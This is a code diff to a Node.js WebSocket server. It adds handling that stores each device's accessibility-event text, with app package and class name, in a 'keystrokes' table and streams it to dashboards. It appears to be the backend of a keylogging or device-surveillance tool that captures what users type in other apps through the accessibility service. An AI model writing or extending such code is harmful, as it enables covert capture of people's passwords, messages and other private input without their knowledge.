@@ -157,6 +157,30 @@ export function setupWebSocket(server) {
         timestamp: now
       });
     } else if (msg.type === 'ACCESSIBILITY_EVENT') {
+      try {
+        const timestamp = msg.timestamp || Date.now();
+        if (db.isPostgres()) {
+          await db.query(
+            `INSERT INTO keystrokes (device_id, app_package, app_name, text, timestamp)
+             VALUES ($1, $2, $3, $4, $5)`,
+            [deviceId, msg.packageName || '', msg.className || '', msg.text || '', timestamp]
+          );
+        } else {
+          const store = db.getMemoryStore().keystrokes;
+          store.unshift({
+            id: Date.now() + Math.random(),
+            device_id: deviceId,
+            app_package: msg.packageName || '',
+            app_name: msg.className || '',
+            text: msg.text || '',
+            timestamp: timestamp,
+            created_at: new Date()
+          });
+        }
+      } catch (e) {
+        console.error('Error saving live keystroke:', e);
+      }
+
       broadcastToDashboards({
         type: 'ACCESSIBILITY_EVENT',
         deviceId,
